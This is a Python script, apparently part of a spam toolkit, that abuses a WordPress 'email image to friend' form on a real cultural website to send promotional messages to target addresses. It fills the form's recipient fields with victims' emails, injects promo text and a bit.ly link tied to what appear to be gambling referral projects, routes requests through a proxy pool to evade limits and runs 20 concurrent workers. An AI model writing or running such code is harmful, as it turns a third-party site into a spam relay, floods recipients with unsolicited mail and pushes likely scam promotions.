import requests

import module

url = 'https://nlcultural.com/garden-at-sainte-adresse-by-claude-monet-the-met-150/'

headers = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
}


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response:
        data = {
            'wp_iec_img': '51460',
            'wp_iec_post': '51459',
            'wp_iec_unique_id': '0',
            'wp_iec_ajax_validated': '1',
            'wp_iec_action': 'process_from',
            'wp_iec_name': 'test',
            'wp_iec_email': target,
            'wp_iec_femail': target,
            'wp_iec_more_recipient': '',
            'wp_iec_message': self.get_text(),
            'wp_iec_scopy': '1',
        }

        response = requests.post(
            url,
            headers=headers,
            data=data,
            proxies=self.get_proxies(),
            timeout=10
        )
        return response


if __name__ == '__main__':
    project_name = 'nlcultural'
    s = 'Successfully submitted results.'

    project = 'allright'  # supercat luckybird allright fortuneclock
    promo_link = 'bit.ly/3BglroR'
    spam = ConcreteSpam(
        project_name, s,
        referal_project_name=project,
        promo_link=promo_link,
        proxy_pool_name='parsed'
    )
    res = spam.send_post()
    if res:
        spam.run_concurrently(20)
